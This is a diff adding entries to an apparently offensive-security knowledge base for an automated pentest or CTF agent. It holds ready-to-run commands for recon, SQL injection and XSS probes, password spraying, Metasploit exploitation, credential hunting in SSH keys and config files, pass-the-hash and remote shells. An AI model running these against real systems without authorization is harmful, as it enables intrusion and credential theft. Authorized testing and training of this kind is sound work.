@@ -1781,5 +1781,941 @@
       "technique": "ecu-fuzzing",
       "tool": "caringcaribou"
     }
+  },
+  {
+    "id": "recon-nmap-host-discovery",
+    "content": "Nmap host discovery (ping sweep)\nPurpose: find live hosts in a range before port scanning\nCommand: nmap -sn <cidr>\nFaster alternative for large ranges: fping -a -g <cidr> 2>/dev/null\nOr with masscan: masscan <cidr> --rate=10000 -p80 --open\nResult: 'Host is up' lines \u2014 extract IPs for next step\nSkip for single IPs \u2014 go directly to port scan",
+    "metadata": {
+      "category": "recon",
+      "technique": "host-discovery",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "recon-nmap-fast-tcp-scan",
+    "content": "Nmap fast full TCP port scan\nCommand: nmap -sS -p- --min-rate 5000 -oN /work/nmap_ports.txt <target>\nAlso run UDP top ports: nmap -sU --top-ports 100 -oN /work/nmap_udp.txt <target>\nIf too slow: masscan -p1-65535 <target> --rate=10000 first, then nmap on open ports\nParse open ports: grep '^[0-9]' /work/nmap_ports.txt | awk -F/ '{print $1}' | tr '\\n' ','\nResult: comma-separated open port list for service detection",
+    "metadata": {
+      "category": "recon",
+      "technique": "port-scanning",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "recon-nmap-service-detection",
+    "content": "Nmap service version and script detection\nCommand: nmap -sV -sC -p <open_ports> -oN /work/nmap_services.txt <target>\nRecord: service name, exact version string, banner text\nKey NSE scripts auto-run with -sC: http-title, ssh-hostkey, ftp-anon, smb-security-mode\nFor more aggressive fingerprinting: add -A (enables OS detection + traceroute)\nFor web services specifically: add --script=http-methods,http-headers\nSave version strings verbatim \u2014 they feed searchsploit and NVD queries",
+    "metadata": {
+      "category": "recon",
+      "technique": "service-detection",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "recon-dns-enumeration",
+    "content": "DNS enumeration workflow\n1. ANY query: dig ANY <domain> +noall +answer\n2. Zone transfer (misconfiguration check): dig axfr <domain> @<nameserver>\n   NS=$(dig NS <domain> +short | head -1); dig axfr <domain> @$NS\n3. Standard records: dig +short MX <domain>; dig +short TXT <domain>; dig +short NS <domain>\n4. Subdomain brute force: dnsrecon -d <domain> -t std 2>/dev/null\n5. Passive subdomain enum: amass enum -passive -d <domain> -o /work/amass.txt 2>/dev/null\nResult: hostnames, mail servers, SPF records, zone data if transfer allowed",
+    "metadata": {
+      "category": "recon",
+      "technique": "dns-enum",
+      "tool": "dig"
+    }
+  },
+  {
+    "id": "recon-web-surface-httpx",
+    "content": "Web surface mapping with httpx\nFrom host list: httpx -l /work/hosts.txt -status-code -title -tech-detect -follow-redirects -o /work/httpx.txt\nSingle target: httpx -u <target> -status-code -title -tech-detect -follow-redirects\nRecord: HTTP status, page title, detected technology stack, redirect chains\nTechnologies detected feed version-based CVE research\nDo NOT re-curl individual ports after nmap -sC \u2014 banners already captured",
+    "metadata": {
+      "category": "recon",
+      "technique": "web-fingerprint",
+      "tool": "httpx"
+    }
+  },
+  {
+    "id": "osint-whois-lookup",
+    "content": "WHOIS lookup for IP and domain\nDomain: whois <domain> 2>/dev/null | head -40\nIP: whois <ip> 2>/dev/null | head -40\nLook for: registrar, registration date, name servers, admin contact, org\nSkip on RFC1918 addresses \u2014 returns nothing useful\nNote expiry date \u2014 expiring domains may indicate abandoned infrastructure",
+    "metadata": {
+      "category": "osint",
+      "technique": "whois",
+      "tool": "whois"
+    }
+  },
+  {
+    "id": "osint-reverse-dns",
+    "content": "Reverse DNS lookup\nSingle IP: dig -x <ip> +short\nBatch for CIDR (sample 5-10): for ip in $(seq 1 10); do dig -x 192.168.1.$ip +short; done\nAlternative: host <ip>\nResult: hostnames that reveal function (vpn.corp.com, mail.domain.com, dc01.internal.com)\nSkip on RFC1918 \u2014 only useful for public IPs",
+    "metadata": {
+      "category": "osint",
+      "technique": "reverse-dns",
+      "tool": "dig"
+    }
+  },
+  {
+    "id": "osint-ip-asn-ipinfo",
+    "content": "IP information and ASN lookup\nCommand: curl -s --max-time 10 https://ipinfo.io/<ip>/json\nReturns: org (ASN + company), city, country, hostname, abuse contact\nFor ASN range: curl -s https://ipinfo.io/AS<number>/json | jq '.prefixes'\nUseful for: confirming target ownership, finding related IP ranges\nSkip on RFC1918 addresses",
+    "metadata": {
+      "category": "osint",
+      "technique": "asn-lookup",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "osint-shodan-host-query",
+    "content": "Shodan host and search queries (requires SHODAN_API_KEY)\nSingle host: shodan host <ip> 2>/dev/null\nCIDR range: shodan search --fields ip_str,port,org,product \"net:<cidr>\" 2>/dev/null | head -60\nDomain: shodan search --fields ip_str,port,org,product \"hostname:<domain>\" 2>/dev/null | head -50\nReturns: open ports, service banners, CVEs Shodan flagged, SSL cert info\nUseful dorks: port:22 org:\"Target Corp\", \"default password\" hostname:target.com",
+    "metadata": {
+      "category": "osint",
+      "technique": "shodan",
+      "tool": "shodan"
+    }
+  },
+  {
+    "id": "osint-censys-host-view",
+    "content": "Censys host view (requires CENSYS_API_ID + CENSYS_API_SECRET)\nCommand: censys view <ip> 2>/dev/null | head -60\nAlternative via API: censys search \"ip:<ip>\" --index hosts 2>/dev/null\nReturns: open ports, service protocols, TLS certificates, ASN data\nUseful for finding services Shodan missed (HTTPS, non-standard ports)",
+    "metadata": {
+      "category": "osint",
+      "technique": "censys",
+      "tool": "censys"
+    }
+  },
+  {
+    "id": "osint-virustotal-ip",
+    "content": "VirusTotal IP reputation lookup (requires VIRUSTOTAL_API_KEY)\nCommand: curl -s --max-time 10 \"https://www.virustotal.com/api/v3/ip_addresses/<ip>\" \\\n  -H \"x-apikey: $VIRUSTOTAL_API_KEY\" \\\n  | jq '.data.attributes | {reputation, country, as_owner, last_analysis_stats}'\nReturns: malicious/suspicious vendor flags, ASN owner, country\nNegative reputation = may be flagged/blocked by defenders",
+    "metadata": {
+      "category": "osint",
+      "technique": "virustotal",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "osint-virustotal-domain",
+    "content": "VirusTotal domain reputation lookup (requires VIRUSTOTAL_API_KEY)\nCommand: curl -s --max-time 10 \"https://www.virustotal.com/api/v3/domains/<domain>\" \\\n  -H \"x-apikey: $VIRUSTOTAL_API_KEY\" \\\n  | jq '.data.attributes | {reputation, registrar, creation_date, last_dns_records}'\nReturns: registration info, DNS history, malicious flags, subdomains seen\nDNS records history can reveal infrastructure changes over time",
+    "metadata": {
+      "category": "osint",
+      "technique": "virustotal",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "osint-dns-records-all",
+    "content": "Full DNS record enumeration\nAll records: dig +noall +answer ANY <domain>\nMail servers: dig +short MX <domain>\nSPF/DMARC: dig +short TXT <domain>\nName servers: dig +short NS <domain>\nSPF record reveals mail infrastructure and cloud providers\nDMARC policy (p=reject/quarantine/none) indicates phishing resilience\nNS servers may reveal hosting provider or internal DNS",
+    "metadata": {
+      "category": "osint",
+      "technique": "dns-records",
+      "tool": "dig"
+    }
+  },
+  {
+    "id": "osint-zone-transfer",
+    "content": "DNS zone transfer attempt (misconfiguration check)\nCommands:\n  NS=$(dig NS <domain> +short | head -1)\n  dig axfr <domain> @$NS 2>/dev/null | head -40\nSuccess: full zone data returned (all hostnames, IPs, record types)\nFailure: 'Transfer failed' or 'REFUSED' \u2014 expected on secured servers\nSuccess is a critical finding \u2014 store as vulnerability severity=high\nTry each nameserver: dig NS <domain> +short | while read ns; do dig axfr <domain> @$ns; done",
+    "metadata": {
+      "category": "osint",
+      "technique": "zone-transfer",
+      "tool": "dig"
+    }
+  },
+  {
+    "id": "osint-crtsh-cert-transparency",
+    "content": "Certificate transparency subdomain discovery via crt.sh (no API key needed)\nCommand: curl -s --max-time 20 \"https://crt.sh/?q=%25.<domain>&output=json\" \\\n  | jq -r '.[].name_value' 2>/dev/null | sort -u | tee /work/osint_subdomains.txt | head -80\nReturns: all subdomains seen in certificate logs (wildcard entries, dev/staging/internal)\nFilter wildcards: grep -v '^\\*' /work/osint_subdomains.txt\nLook for: dev., staging., internal., vpn., admin., api. subdomains",
+    "metadata": {
+      "category": "osint",
+      "technique": "cert-transparency",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "osint-subdomain-enum-workflow",
+    "content": "Subdomain enumeration workflow\n1. Passive (crt.sh): see osint-crtsh-cert-transparency\n2. DNS brute force: dnsrecon -d <domain> -t std 2>/dev/null | head -60\n3. Multi-source passive: amass enum -passive -d <domain> -o /work/osint_amass.txt 2>/dev/null\n4. Check subdomains for live hosts: httpx -l /work/osint_subdomains.txt -status-code -title -o /work/live_subs.txt\nCombine results: cat /work/osint_amass.txt /work/osint_subdomains.txt | sort -u > /work/all_subs.txt\nFlag subdomain takeover candidates: subdomains pointing to deprovisioned cloud services",
+    "metadata": {
+      "category": "osint",
+      "technique": "subdomain-enum",
+      "tool": "amass"
+    }
+  },
+  {
+    "id": "osint-email-harvesting",
+    "content": "Email address harvesting\ntheHarvester (multi-source): theHarvester -d <domain> -b bing,duckduckgo,crtsh -l 300 \\\n  -f /work/osint_harvest 2>/dev/null\nRead results: cat /work/osint_harvest.json 2>/dev/null | jq '.emails // []'\nHunter.io (if HUNTER_API_KEY set): curl -s --max-time 10 \\\n  \"https://api.hunter.io/v2/domain-search?domain=<domain>&limit=20&api_key=$HUNTER_API_KEY\" \\\n  | jq '.data | {organization, emails: [.emails[].value]}'\nInfer naming convention from found emails (first.last@, flast@, f.last@)\nUse convention to build username lists for credential attacks",
+    "metadata": {
+      "category": "osint",
+      "technique": "email-harvesting",
+      "tool": "theHarvester"
+    }
+  },
+  {
+    "id": "web-content-discovery-ffuf",
+    "content": "Web content discovery with ffuf\nBasic discovery: ffuf -u http://<target>/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/common.txt \\\n  -mc 200,301,302,403 -o /work/web_ffuf.json -of json\nFilter by size to remove false positives: add -fs <size_of_404_response>\nRecursive: add -recursion -recursion-depth 2\nWith extensions: add -e .php,.html,.txt,.bak,.old\nInteresting status codes: 403 (forbidden but exists), 301/302 (redirect targets)",
+    "metadata": {
+      "category": "web",
+      "technique": "content-discovery",
+      "tool": "ffuf"
+    }
+  },
+  {
+    "id": "web-api-discovery-ffuf",
+    "content": "API endpoint discovery with ffuf\nAPI paths: ffuf -u http://<target>/api/FUZZ \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-endpoints.txt \\\n  -mc 200,201,204,301,302\nVersioned APIs: ffuf -u http://<target>/FUZZ/users \\\n  -w /usr/share/seclists/Discovery/Web-Content/api/api-seen-in-wild.txt\nAlso try: /v1/, /v2/, /api/v1/, /rest/, /graphql, /swagger.json, /openapi.json\nSwagger/OpenAPI found: parse for all endpoints and parameters automatically\ncurl -s http://<target>/swagger.json | jq '.paths | keys'",
+    "metadata": {
+      "category": "web",
+      "technique": "api-discovery",
+      "tool": "ffuf"
+    }
+  },
+  {
+    "id": "web-httpx-fingerprinting",
+    "content": "Web technology fingerprinting with httpx\nCommand: httpx -u <target> -status-code -title -tech-detect -follow-redirects -o /work/web_httpx.txt\nAlso check response headers manually:\n  curl -si http://<target>/ | head -30\nKey headers: Server (nginx/Apache/IIS version), X-Powered-By (PHP/ASP.NET), \n  Set-Cookie (session cookie name reveals framework), X-Generator\nTechnology identified \u2192 search KB for known debug/admin endpoints for that tech\nVersion detected \u2192 feed into searchsploit and NVD CVE lookup",
+    "metadata": {
+      "category": "web",
+      "technique": "fingerprinting",
+      "tool": "httpx"
+    }
+  },
+  {
+    "id": "web-default-credentials",
+    "content": "Default credential testing for web applications\nCommon admin credentials to try:\n  admin:admin, admin:password, admin:password123, admin:admin123\n  administrator:administrator, root:root, root:toor\n  admin:<blank>, test:test, guest:guest\nService-specific: check KB for application name (e.g. 'tomcat default credentials')\nAfter login attempt: follow redirect with -L and verify authenticated content is served\n  curl -si -c /tmp/cookies.txt -d 'user=admin&pass=admin' http://<target>/login -L\nSuccess: response contains dashboard content, username, or logged-in indicator",
+    "metadata": {
+      "category": "web",
+      "technique": "default-credentials",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "web-sqli-testing-ladder",
+    "content": "SQL injection testing ladder \u2014 escalate through steps until confirmed\nStep 1 \u2014 syntax probe:\n  curl -s \"http://<target>/page?id=1'\" \u2014 look for DB error in response\nStep 2 \u2014 boolean-based (compare true vs false):\n  curl -s \"http://<target>/page?id=1 AND 1=1\" \u2014 should match baseline\n  curl -s \"http://<target>/page?id=1 AND 1=2\" \u2014 should differ (different content/length)\nStep 3 \u2014 time-based (if boolean gives identical responses):\n  curl -s \"http://<target>/page?id=1;SELECT+SLEEP(5)--\"\n  curl -s \"http://<target>/page?id=1'+AND+SLEEP(5)--\"\nStep 4 \u2014 UNION (if error message visible):\n  curl -s \"http://<target>/page?id=0+UNION+SELECT+NULL,NULL--\"\nAny indicator confirmed \u2192 request approval \u2192 sqlmap:\n  sqlmap -u \"http://<target>/page?id=1\" --batch --level=2 --risk=1 --output-dir=/work/sqlmap/",
+    "metadata": {
+      "category": "web",
+      "technique": "sql-injection",
+      "tool": "sqlmap"
+    }
+  },
+  {
+    "id": "web-xss-testing-workflow",
+    "content": "XSS testing workflow\nStep 1 \u2014 reflect probe into each input:\n  curl -s \"http://<target>/search?q=<script>alert(1)</script>\"\n  curl -s \"http://<target>/search?q=%22><img src=x onerror=alert(1)>\"\n  Look for: payload unencoded in response HTML\nStep 2 \u2014 if reflected unencoded (NOT confirmed yet): request approval \u2192 dalfox:\n  dalfox url \"http://<target>/search?q=test\" -o /work/xss_dalfox.txt\nConfirmed only when: JavaScript actually executes in response (dalfox confirms)\nNOT confirmed by: payload appearing in HTML source (may be sanitized by browser)\nStored XSS: inject into forms, check if payload appears on a different page/user view",
+    "metadata": {
+      "category": "web",
+      "technique": "xss",
+      "tool": "dalfox"
+    }
+  },
+  {
+    "id": "web-sensitive-files",
+    "content": "Sensitive file and misconfiguration checks\nRun these on every web target:\n  curl -s http://<target>/.env\n  curl -s http://<target>/.git/HEAD\n  curl -s http://<target>/robots.txt\n  curl -s http://<target>/sitemap.xml\n  curl -s http://<target>/backup.zip\n  curl -s http://<target>/phpinfo.php\n  curl -s http://<target>/server-status\n  curl -s http://<target>/actuator/env (Spring Boot)\n  curl -s http://<target>/.DS_Store\n.env: contains API keys, DB passwords, secrets\n.git/HEAD: 'ref: refs/heads/main' = git repo exposed \u2192 dump with git-dumper\nphpinfo.php: reveals full server config, installed extensions, path disclosure",
+    "metadata": {
+      "category": "web",
+      "technique": "misconfig",
+      "tool": "curl"
+    }
+  },
+  {
+    "id": "web-nuclei-scan",
+    "content": "Nuclei vulnerability scan\nBroad vulnerability scan (requires approval):\n  nuclei -u http://<target> -t /root/nuclei-templates/vulnerabilities/ \\\n    -severity medium,high,critical -o /work/nuclei.txt\nCVE-specific template:\n  nuclei -u http://<target> -t /root/nuclei-templates/cves/<CVE-ID>.yaml -o /work/nuclei_cve.txt\nTech-specific: nuclei -u <target> -tags wordpress,apache,nginx -o /work/nuclei_tech.txt\nExposed panels: nuclei -u <target> -t /root/nuclei-templates/exposed-panels/ -o /work/panels.txt\nFilter results: grep -E 'critical|high' /work/nuclei.txt",
+    "metadata": {
+      "category": "web",
+      "technique": "vulnerability-scan",
+      "tool": "nuclei"
+    }
+  },
+  {
+    "id": "network-credential-testing-netexec",
+    "content": "Multi-protocol credential testing with netexec (formerly crackmapexec)\nSingle credential pair: netexec <protocol> <target> -u <user> -p <pass>\nProtocols: ssh, smb, winrm, ldap, mssql, ftp, rdp, wmi\nSpray one password against user list:\n  netexec smb <target> -u users.txt -p 'Password123' --continue-on-success\nTest with hash (PTH): netexec smb <target> -u <user> -H <ntlm_hash>\nCheck admin access: look for '(Pwn3d!)' in output\nStore credentials immediately on success before moving on\nFor services netexec doesn't cover: nmap -p <port> --script <svc>-brute <target>",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "credential-testing",
+      "tool": "netexec"
+    }
+  },
+  {
+    "id": "network-nmap-brute-scripts",
+    "content": "Nmap brute force NSE scripts for services not covered by netexec\nFTP: nmap -p 21 --script ftp-brute <target>\nSSH: nmap -p 22 --script ssh-brute <target>\nTelnet: nmap -p 23 --script telnet-brute <target>\nSNMP: nmap -sU -p 161 --script snmp-brute <target>\nHTTP basic auth: nmap -p 80 --script http-brute <target>\nCustom wordlist: add --script-args brute.firstonly=true,userdb=/path,passdb=/path\nNote: nmap brute scripts are slow \u2014 use netexec for SMB/SSH/WinRM when possible",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "brute-force",
+      "tool": "nmap"
+    }
+  },
+  {
+    "id": "network-searchsploit-workflow",
+    "content": "ExploitDB and NVD CVE research workflow\nsearchsploit by service+version:\n  searchsploit \"<service> <version>\"\n  searchsploit --id \"<service> <version>\"  # get EDB-ID for Metasploit\n  searchsploit -x <edb-id>  # view exploit code\nNVD API lookup:\n  curl -s \"https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=<service>+<version>&resultsPerPage=5\" \\\n    | jq '.vulnerabilities[]?.cve | {id:.id, severity:.metrics.cvssMetricV31[0]?.cvssData.baseSeverity, \\\n           desc:.descriptions[0].value}'\nPrioritise: CVSS >= 7.0, RCE > auth bypass > info disclosure, network-accessible over local",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "cve-research",
+      "tool": "searchsploit"
+    }
+  },
+  {
+    "id": "network-unknown-service-probing",
+    "content": "Unknown service protocol identification \u2014 5-probe sequence\nBefore probing: check memory for prior context on this port\n1. Banner grab:   nc -w 3 <target> <port>\n2. Newline probe: echo '' | nc -w 3 <target> <port>\n3. HTTP GET:      curl -sv http://<target>:<port>/\n4. Null bytes:    printf '\\x00\\x00\\x00\\x00' | nc -w 3 <target> <port>\n5. HELP command:  printf 'HELP\\r\\n' | nc -w 3 <target> <port>\nAfter 5 probes with no recognizable pattern:\n  store_finding type='finding', title='Unknown binary service port <N>',\n  description='Protocol unidentified after 5 structured probes'\nDo NOT run exhaustive byte sweeps \u2014 5 probes is the hard limit",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "service-id",
+      "tool": "nc"
+    }
+  },
+  {
+    "id": "network-msfconsole-module-exec",
+    "content": "Metasploit module execution one-liner pattern\nCRITICAL: always end -x string with '; exit' \u2014 without it msfconsole hangs forever\nBasic exploit:\n  msfconsole -q -x \"use <module>; set RHOSTS <target>; set RPORT <port>; \\\n    set LHOST <your_ip>; set LPORT 4444; run; exit\" 2>/dev/null\nAuxiliary scanner:\n  msfconsole -q -x \"use auxiliary/scanner/<service>/login; \\\n    set RHOSTS <target>; set USER_FILE /path/users.txt; set PASS_FILE /path/pass.txt; \\\n    run; exit\" 2>/dev/null\nCheck your IP first: ip addr show | grep 'inet ' \u2014 use tun0 for VPN, eth0 for local",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "metasploit",
+      "tool": "msfconsole"
+    }
+  },
+  {
+    "id": "network-nuclei-cve-template",
+    "content": "Nuclei CVE template scanning for network services\nSpecific CVE: nuclei -u <target>:<port> -t /root/nuclei-templates/cves/<CVE-ID>.yaml -o /work/nuclei_cve.txt\nFind template: ls /root/nuclei-templates/cves/ | grep <service>\nTech-specific templates: ls /root/nuclei-templates/technologies/ | grep <tech>\nSeverity filter: nuclei -u <target> -t /root/nuclei-templates/cves/ -severity critical,high\nResult shows: matched template, target, extracted data\nPositive match = confirmed vulnerability \u2014 store as type='vulnerability'",
+    "metadata": {
+      "category": "exploitation",
+      "technique": "nuclei",
+      "tool": "nuclei"
+    }
+  },
+  {
+    "id": "postexploit-situational-awareness",
+    "content": "Post-exploitation situational awareness commands (run after getting shell)\nOnly run these if you have an interactive shell on the TARGET (SSH, RCE, reverse shell)\nDo NOT run if only HTTP credentials \u2014 these show YOUR container, not target\n  whoami && id && hostname && uname -a\n  ip route; ip addr\n  cat /etc/passwd | grep -v nologin\n  ps aux --no-headers | head -30\n  env | grep -v -i 'key\\|pass\\|secret\\|token'\n  cat /etc/crontab 2>/dev/null; ls -la /etc/cron* 2>/dev/null\n  find / -perm -4000 -type f 2>/dev/null | head -20\n  sudo -l 2>/dev/null\nRecord: current user, OS version, network interfaces, SUID binaries, sudo rights",
+    "metadata": {
+      "category": "privesc",
+      "technique": "situational-awareness",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "postexploit-linpeas",
+    "content": "LinPEAS automated local privilege escalation enumeration\nRun (requires approval, risk=low):\n  bash /opt/peas/linpeas.sh 2>/dev/null | tee /work/postexploit/linpeas.txt\nKey sections to read in output:\n  - 'Interesting SUID files' \u2014 binaries with SUID bit set\n  - 'Sudo version' + 'Sudo -l output' \u2014 sudo misconfigs\n  - 'Writable files' \u2014 world-writable scripts in cron paths\n  - 'NFS exports' \u2014 no_root_squash misconfig\n  - 'Docker/LXC' \u2014 container escape vectors\n  - 'Kernel version' \u2014 compare against kernel CVEs\n  - 'Password files' \u2014 credentials in config files\nColor coding: RED/YELLOW = high-interest findings",
+    "metadata": {
+      "category": "privesc",
+      "technique": "automated-enum",
+      "tool": "linpeas"
+    }
+  },
+  {
+    "id": "postexploit-credential-hunting",
+    "content": "Credential hunting on compromised host\nSSH keys:\n  cat /home/*/.ssh/id_rsa 2>/dev/null\n  cat /root/.ssh/id_rsa 2>/dev/null\nShell history:\n  cat /home/*/.bash_history 2>/dev/null | grep -i 'pass\\|key\\|token\\|secret' | head -30\n  cat /root/.bash_history 2>/dev/null | grep -i 'pass\\|key\\|token\\|secret' | head -30\nConfig files:\n  grep -r 'password\\|passwd\\|secret\\|api_key' /var/www/ /opt/ /srv/ /etc/ 2>/dev/null \\\n    --include='*.conf' --include='*.env' --include='*.cfg' --include='*.ini' -l | head -20\n  find / -name '.env' -o -name '*.env' 2>/dev/null | xargs grep -l 'password\\|secret' 2>/dev/null\nDatabase creds:\n  cat /etc/mysql/debian.cnf 2>/dev/null\n  grep -r 'DB_PASS\\|DB_PASSWORD' /var/www/ 2>/dev/null | head -10\nStore each credential found immediately before moving on",
+    "metadata": {
+      "category": "privesc",
+      "technique": "credential-hunting",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "postexploit-flag-capture",
+    "content": "CTF flag capture patterns\nStandard HTB/CTF locations:\n  cat /root/root.txt 2>/dev/null\n  cat /home/*/user.txt 2>/dev/null\nBroad search:\n  find / -name '*.txt' -path '*/flag*' 2>/dev/null | xargs cat 2>/dev/null\n  find / -name 'flag*' -type f 2>/dev/null | xargs cat 2>/dev/null\n  find / -name 'proof.txt' -type f 2>/dev/null | xargs cat 2>/dev/null\nFlag format detection: grep -r 'HTB{\\|CTF{\\|flag{\\|FLAG{' / 2>/dev/null | head -20\nStore found flags: store_finding type='flag', data={value, flag_type (root/user), context}",
+    "metadata": {
+      "category": "ctf",
+      "technique": "flag-capture",
+      "tool": "bash"
+    }
+  },
+  {
+    "id": "postexploit-ssh-lateral",
+    "content": "SSH lateral movement using found credentials or keys\nPassword credential:\n  ssh <user>@<target_ip> -o StrictHostKeyChecking=no 2>/dev/null\nPrivate key:\n  chmod 600 /work/id_rsa && ssh -i /work/id_rsa <user>@<target_ip> -o StrictHostKeyChecking=no\nTest reuse on all known hosts: for ip in <ip_list>; do ssh -i /work/id_rsa <user>@$ip 'whoami' 2>/dev/null; done\nPort forwarding to reach internal services:\n  ssh -L <local_port>:<internal_host>:<internal_port> <user>@<pivot_ip>\nOnly move laterally if explicitly tasked or if scope permits additional hosts",
+    "metadata": {
+      "category": "privesc",
+      "technique": "lateral-movement",
+      "tool": "ssh"
+    }
+  },
+  {
+    "id": "ad-smb-enumeration",
+    "content": "SMB enumeration for Active Directory environments\nList shares (no credentials): smbclient -L //<dc_ip> -N 2>/dev/null\nEnum4linux-ng (comprehensive): enum4linux-ng <dc_ip> -A 2>/dev/null | tee /work/enum4linux.txt\nWith credentials: smbclient -L //<dc_ip> -U '<domain>/<user>%<pass>' 2>/dev/null\nCheck null session: smbclient //<dc_ip>/IPC$ -N 2>/dev/null\nnetexec SMB info: netexec smb <dc_ip> 2>/dev/null\n  Shows: OS version, signing required, SMBv1 status\nSMB signing disabled = vulnerable to NTLM relay attacks",
+    "metadata": {
+      "category": "ad",
+      "technique": "smb-enum",
+      "tool": "smbclient"
+    }
+  },
+  {
+    "id": "ad-ldap-anonymous-enum",
+    "content": "LDAP anonymous bind enumeration\nTest anonymous bind:\n  ldapsearch -x -H ldap://<dc_ip> -b '' -s base namingContexts 2>/dev/null\nFull user enum (anonymous):\n  ldapsearch -x -H ldap://<dc_ip> -b 'DC=<domain>,DC=<tld>' \\\n    '(objectClass=user)' sAMAccountName userPrincipalName memberOf \\\n    2>/dev/null | head -200 > /work/ad_ldap.txt\nWith credentials:\n  ldapsearch -x -H ldap://<dc_ip> -D '<user>@<domain>' -w '<pass>' \\\n    -b 'DC=<domain>,DC=<tld>' '(objectClass=user)' sAMAccountName\nAnonymous bind success = store as vulnerability severity=medium\nExtract usernames: grep sAMAccountName /work/ad_ldap.txt | awk '{print $2}'",
+    "metadata": {
+      "category": "ad",
+      "technique": "ldap-enum",
+      "tool": "ldapsearch"
+    }
+  },
+  {
+    "id": "ad-bloodhound-python-collection",
+    "content": "BloodHound data collection with bloodhound-python (requires credentials)\nCommand: bloodhound-python -c All -d <domain> -u <user> -p <pass> \\\n  -ns <dc_ip> --zip -o /work/bloodhound/ 2>/dev/null\nCollection methods: All, DCOnly, Group, LocalAdmin, LoggedOn, RDP, Session, Trusts\nOutput: zip file containing JSON files for nodes and edges\nUpload to BloodHound GUI: drag zip file into the interface\nKey queries to run after upload:\n  'Shortest path to Domain Admins'\n  'Find all Domain Admins'\n  'Principals with DCSync rights'\n  'Find AS-REP Roastable Users'",
+    "metadata": {
+      "category": "ad",
+      "technique": "bloodhound",
+      "tool": "bloodhound-python"
+    }
+  },
+  {
+    "id": "ad-evil-winrm-usage",
+    "content": "Evil-WinRM remote shell (requires WinRM port 5985/5986 and valid credentials)\nPassword: evil-winrm -i <target_ip> -u <user> -p <pass>\nNTLM hash: evil-winrm -i <target_ip> -u <user> -H <ntlm_hash>\nCheck if WinRM open: netexec winrm <target_ip> -u <user> -p <pass>\nInside session:\n  upload /local/path remote_path  \u2014 upload files\n  download remote_path /local/path \u2014 download files\n  menu  \u2014 show available commands including Invoke-Binary, Bypass-4MSI\nRequires: user must be in 'Remote Management Users' or local Administrators group",
+    "metadata": {
+      "category": "ad",
+      "technique": "winrm",
+      "tool": "evil-winrm"
+    }
+  },
+  {
+    "id": "lateral-movement-cme-pth",
+    "content": "Pass-the-Hash lateral movement with netexec/CrackMapExec\nTest access: netexec smb <target> -u <user> -H <ntlm_hash>\nExecute command: netexec smb <target> -u <user> -H <ntlm_hash> -x 'whoami /all'\nSpray hash across subnet: netexec smb <cidr> -u <user> -H <ntlm_hash> --continue-on-success\nGet shell via wmiexec: impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm_hash>\nShell via psexec: impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>\nHash format: LM:NT \u2014 if no LM hash use aad3b435b51404eeaad3b435b51404ee:<ntlm>\nSuccess indicator: '(Pwn3d!)' in netexec output or shell prompt returned",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "pass-the-hash",
+      "tool": "netexec"
+    }
+  },
+  {
+    "id": "lateral-movement-psexec-impacket",
+    "content": "Impacket PsExec lateral movement (requires admin share access)\nPassword: impacket-psexec <domain>/<user>:<pass>@<target>\nHash: impacket-psexec <domain>/<user>@<target> -hashes :<ntlm_hash>\nCreates a service on the target \u2014 visible in event logs (noisier than wmiexec)\nDrops a file in ADMIN$ share \u2014 detected by EDR more easily\nAlternative (quieter): impacket-wmiexec <domain>/<user>:<pass>@<target>\nEven quieter: impacket-smbexec <domain>/<user>:<pass>@<target>\nAll three require SMB port 445 and admin credentials",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "psexec",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "lateral-movement-wmiexec-impacket",
+    "content": "Impacket WMIExec \u2014 semi-interactive shell via WMI (quieter than PsExec)\nPassword: impacket-wmiexec <domain>/<user>:<pass>@<target>\nHash: impacket-wmiexec <domain>/<user>@<target> -hashes :<ntlm_hash>\nSingle command: impacket-wmiexec <domain>/<user>:<pass>@<target> 'whoami'\nUses WMI (port 135 + dynamic RPC) \u2014 does not create services like PsExec\nLeaves WMI event logs but no file artifacts in ADMIN$\nRequires: admin credentials, WMI accessible (firewall may block)",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "wmiexec",
+      "tool": "impacket"
+    }
+  },
+  {
+    "id": "lateral-movement-winrm-evil",
+    "content": "WinRM lateral movement (port 5985/5986)\nCheck access: netexec winrm <target> -u <user> -p <pass>\nInteractive shell: evil-winrm -i <target> -u <user> -p <pass>\nHash: evil-winrm -i <target> -u <user> -H <ntlm_hash>\nPowerShell remoting (from Windows): Enter-PSSession -ComputerName <target> -Credential <cred>\nWinRM typically enabled on Windows Server 2012+ and managed workstations\nRequires user in 'Remote Management Users' or local Administrators group",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "winrm",
+      "tool": "evil-winrm"
+    }
+  },
+  {
+    "id": "lateral-movement-rdp",
+    "content": "RDP lateral movement (port 3389)\nCheck access: netexec rdp <target> -u <user> -p <pass>\nConnect: xfreerdp /u:<user> /p:<pass> /v:<target> /cert-ignore\nWith domain: xfreerdp /u:<user> /d:<domain> /p:<pass> /v:<target> /cert-ignore\nRestricted admin mode (PTH): xfreerdp /u:<user> /pth:<ntlm_hash> /v:<target> /restricted-admin\nRequires: user in 'Remote Desktop Users' or local Administrators group\nNote: RDP creates interactive logon events (Type 10) \u2014 visible in Security logs",
+    "metadata": {
+      "category": "lateral-movement",
+      "technique": "rdp",
+      "tool": "xfreerdp"
+    }
+  },
+  {
